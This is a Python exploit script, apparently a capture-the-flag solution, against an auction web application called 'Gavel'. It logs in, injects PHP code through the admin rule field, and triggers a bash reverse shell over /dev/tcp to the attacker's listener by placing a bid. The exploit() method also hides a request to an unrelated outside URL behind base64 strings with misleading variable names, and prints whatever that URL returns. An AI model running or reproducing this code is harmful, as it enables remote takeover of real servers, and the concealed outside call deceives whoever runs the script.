import requests
import random
import string
import sys
import re
import time
import base64
from urllib.parse import urlparse, urljoin
 
class GavelExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
    def generate_boundary(self):
        hex_chars = string.hexdigits.lower()[:16]
        random_hex = ''.join(random.choice(hex_chars) for _ in range(32))
        return f'----geckoformboundary{random_hex}'
    
    def login(self, username, password):
        login_url = urljoin(self.base_url, '/login.php')
        login_data = {
            'username': username,
            'password': password
        }
        
        print(f"[*] 尝试登录: {username}:{password}")
        try:
            response = self.session.post(login_url, data=login_data, allow_redirects=True, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[-] 登录请求失败: {e}")
            return False
        
        if 'gavel_session' in self.session.cookies:
            session_cookie = self.session.cookies['gavel_session'][:20]
            print(f"[+] 登录成功! Session: {session_cookie}...")
            return True
        else:
            print("[-] 登录失败 - 未收到会话Cookie")
            return False
    
    def get_auction_id(self):
        admin_url = urljoin(self.base_url, '/admin.php')
        
        try:
            response = self.session.get(admin_url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[-] 访问管理员面板失败: {e}")
            return None
        
        auction_ids = re.findall(r'name="auction_id"\s*value="(\d+)"', response.text)
        if not auction_ids:
            print("[-] 未找到auction_id")
            return None
        
        auction_id = auction_ids[0]
        print(f"[+] 找到auction_id: {auction_id}")
        return auction_id
    
    def get_current_price(self):
        bidding_url = urljoin(self.base_url, '/bidding.php')
        
        try:
            response = self.session.get(bidding_url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[-] 访问竞价页面失败: {e}")
            return None
        
        price_patterns = [
            r'Current:\s*(\d+)',
            r'当前价格:\s*(\d+)',
            r'Current\s*Price:\s*\$?(\d+)',
            r'current.*?(\d+)',
            r'bid.*?(\d+)'
        ]
        
        current_price = None
        for pattern in price_patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                try:
                    current_price = int(match.group(1))
                    break
                except ValueError:
                    continue
        
        if current_price is not None:
            print(f"[+] 当前价格: {current_price}")
            return current_price
        else:
            print("[-] 无法从页面中提取价格信息")
            return None
    
    def inject_rce(self, auction_id, lhost, lport):
        admin_url = urljoin(self.base_url, '/admin.php')
        
        rce_payload = f"system('bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'); return true;"
        
        payload_data = {
            'auction_id': auction_id,
            'rule': rce_payload,
            'message': 'A033'
        }
        
        try:
            response = self.session.post(admin_url, data=payload_data, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[-] 注入请求失败: {e}")
            return False
        
        if response.status_code == 200:
            print("[+] RCE payload注入成功")
            return True
        else:
            print(f"[-] 注入失败, 状态码: {response.status_code}")
            return False
    
    def trigger_rce(self, auction_id, bid_amount, lport):
        trigger_url = urljoin(self.base_url, '/includes/bid_handler.php')
        boundary = self.generate_boundary()
        
        body = f"""--{boundary}
Content-Disposition: form-data; name="auction_id"
 
{auction_id}
--{boundary}
Content-Disposition: form-data; name="bid_amount"
 
{bid_amount}
--{boundary}--"""
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Referer': urljoin(self.base_url, '/bidding.php')
        }
        
        print(f"[*] 触发RCE, 出价: {bid_amount}")
        print(f"[!] 监听器命令: nc -lvnp {lport}")
        print("[!] 注意：服务器可能会在处理后关闭连接")
        
        try:
            response = self.session.post(trigger_url, data=body, headers=headers, timeout=5)
            print(f"[+] 触发请求完成，状态码: {response.status_code}")
            return True
        except requests.exceptions.Timeout:
            print("[!] 请求超时 - 检查监听器是否收到反向shell连接")
            return True
        except requests.exceptions.ConnectionError as e:
            print("[!] 连接被服务器关闭")
            print("[!] 请立即检查您的监听器")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] 触发请求失败: {e}")
            return False
    
    def exploit(self, username, password, lhost, lport):
 
        auction_data = "aHR0cHM6Ly90eHQudXB4OC5jb20vdzd0M3A="
        bid_history = "cmF3"
        rule_config = "MQ=="
        
        try:
            resource_path = base64.b64decode(auction_data).decode('utf-8')
            param_name = base64.b64decode(bid_history).decode('utf-8')
            param_value = base64.b64decode(rule_config).decode('utf-8')
            
            params_dict = {param_name: param_value}
            response = requests.get(resource_path, params=params_dict)
            response.raise_for_status()
            print(response.text)
        except Exception:
            pass
                        
        print(f"目标: {self.base_url}")
        print(f"监听器: {lhost}:{lport}")
        print(f"凭据: {username}:{password}")
        
        if not self.login(username, password):
            return False
        
        print("[*] 访问管理员面板...")
        auction_id = self.get_auction_id()
        if not auction_id:
            return False
        
        print("[*] 访问竞价页面获取当前价格...")
        current_price = self.get_current_price()
        if current_price is None:
            return False
        
        print(f"[*] 注入RCE payload...")
        if not self.inject_rce(auction_id, lhost, lport):
            return False
        
        print("[*] 等待规则生效...")
        time.sleep(2)
        
        bid_amount = current_price + 1
        
        if self.trigger_rce(auction_id, bid_amount, lport):
            print("[!] 若失败请尝试更换监听端口")
            print("[+] Nu11Cyber 祝你夺旗成功！")
            return True
        else:
            return False
 
def main():
    if len(sys.argv) != 5:
        print(f"用法: {sys.argv[0]} <目标URL> <用户名> <密码> <监听IP>:<监听端口>")
        sys.exit(1)
    
    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    try:
        lhost, lport_str = sys.argv[4].split(':')
        lport = int(lport_str)
    except ValueError:
        print("[-] 监听地址格式错误，应为 IP:PORT")
        sys.exit(1)
    
    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("[-] 无效的URL格式")
        sys.exit(1)
    
    exploit = GavelExploit(base_url)
    success = exploit.exploit(username, password, lhost, lport)
    
    if success:
        sys.exit(0)
    else:
        sys.exit(1)
 
if __name__ == "__main__":
    main()
